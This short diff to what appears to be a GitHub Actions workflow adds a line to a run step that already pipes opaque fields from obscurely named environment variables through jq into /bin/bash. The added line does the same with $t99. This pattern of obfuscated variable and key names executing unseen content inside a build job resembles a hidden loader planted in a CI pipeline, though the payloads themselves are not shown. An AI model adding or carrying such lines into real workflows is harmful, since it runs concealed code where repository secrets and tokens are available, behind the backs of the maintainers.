@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$kw29" | jq -r .cvzbd74653 | /bin/bash
           echo $pv220 | jq -r .j194 | /bin/bash
+          echo $t99 | jq -r .zccf4536 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
